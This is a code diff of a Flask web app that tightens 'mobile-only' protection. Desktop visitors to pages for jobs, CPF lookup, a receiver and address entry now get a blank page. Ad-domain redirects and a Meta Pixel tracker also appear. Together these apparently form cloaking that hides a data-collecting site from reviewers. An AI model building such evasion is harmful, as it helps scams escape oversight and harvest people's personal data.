@@ -17,6 +17,7 @@ from heroku_optimizer import heroku_optimizer
 from simple_mobile_protection import simple_mobile_only
 from meta_pixels import MetaPixelTracker
 from desktop_blocker import check_and_block_desktop, generate_instant_redirect_response
+from enhanced_mobile_protection import mobile_only_enhanced, check_mobile_access_enhanced, generate_about_blank_response
 
 # Initialize Meta Pixel tracker
 meta_pixel_tracker = MetaPixelTracker()
@@ -72,14 +73,19 @@ from database_service import db_analytics
 @app.before_request
 def block_desktop_access():
     """Block ALL desktop access instantly across entire site"""
+    # Skip static files
+    if request.path.startswith('/static'):
+        return None
+        
     # Skip in Replit development environment completely
     if (os.environ.get('REPL_ID') or 
         os.environ.get('REPLIT_ENVIRONMENT') or 
         'replit' in request.headers.get('Host', '').lower()):
         return None
     
-    if check_and_block_desktop():
-        return generate_instant_redirect_response()
+    # Use enhanced mobile protection
+    if check_mobile_access_enhanced():
+        return generate_about_blank_response()
 
 # Minimum loading time in milliseconds
 MIN_LOADING_TIME = 4000
@@ -89,13 +95,13 @@ def serve_font(filename):
     return send_from_directory('static/fonts', filename)
 
 @app.route("/")
-@simple_mobile_only
+@mobile_only_enhanced
 @performance_monitor
 def index():
     return render_template("index.html")
 
 @app.route("/vagas")
-@simple_mobile_only
+@mobile_only_enhanced
 @performance_monitor
 def vagas():
     """Vagas page with domain redirection from ads domain to main domain"""
@@ -106,18 +112,19 @@ def vagas():
     return render_template("vagas.html")
 
 @app.route("/local")
-@simple_mobile_only
+@mobile_only_enhanced
 @performance_monitor
 def local():
     return render_template("local.html")
 
 @app.route("/veiculo")
-@simple_mobile_only
+@mobile_only_enhanced
 @performance_monitor  
 def veiculo():
     return render_template("veiculo.html")
 
 @app.route("/recebedor")
+@mobile_only_enhanced
 def recebedor():
     try:
         # Skip mobile protection for Heroku to prevent redirect loops
@@ -210,7 +217,7 @@ def cleanup_old_sessions():
         health_monitor.log_error(f"Session cleanup error: {str(e)}", "before_request")
 
 @app.route("/api/consulta-cpf", methods=["POST"])
-@simple_mobile_only
+@mobile_only_enhanced
 def consulta_cpf():
     try:
         data = request.get_json()
@@ -398,6 +405,7 @@ def get_user_data():
     })
 
 @app.route("/address", methods=['GET', 'POST'])
+@mobile_only_enhanced
 def address():
     if request.method == 'POST':
         try:
